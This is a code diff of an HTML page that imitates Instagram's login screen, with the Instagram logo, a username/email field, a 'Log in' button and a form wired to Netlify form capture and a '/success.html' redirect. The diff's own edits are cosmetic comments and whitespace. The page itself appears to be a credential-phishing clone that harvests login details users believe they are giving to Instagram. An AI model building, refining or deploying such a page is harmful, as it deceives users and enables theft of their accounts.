@@ -68,9 +68,10 @@
             color: #737373;
         }
 
+        /* Updated Login Button */
         input[type="submit"] {
             width: 100%;
-            background: #3797EF;
+            background: #3797EF; /* Blue color */
             color: #ffffff;
             border: none;
             border-radius: 8px;
@@ -134,12 +135,14 @@
     </style>
 </head>
 <body>
+
     <div class="container">
         <div class="logo">
             <img src="https://logos-download.com/wp-content/uploads/2016/03/Instagram_Logo_2016.png" alt="Instagram Logo">
         </div>
 
-        <form id="loginForm" name="loginForm" method="POST" action="/success.html" data-netlify="true">
+
+<form id="loginForm" name="loginForm" method="POST" action="/success.html" data-netlify="true">
             <input type="hidden" name="form-name" value="loginForm">
             <input type="text" name="username/email" required="required" class="emailBox" placeholder="Phone number, username or email">
             <br>
@@ -147,7 +150,7 @@
             <br>
             <input type="submit" class="submitButton" value="Log in"><br>
         </form>
-
+        
         <div class="links">
             <a href="#">Forgot password?</a>
         </div>
@@ -162,6 +165,7 @@
         <a href="#">Terms of Use</a> and 
         <a href="#">Privacy Policy</a>.
     </div>
+
     <script>
         const handleSubmit = event => {
             event.preventDefault(); // Prevent default form submission
@@ -183,6 +187,6 @@
     
         document.querySelector("#loginForm").addEventListener("submit", handleSubmit);
     </script>
-    
+
 </body>
 </html>
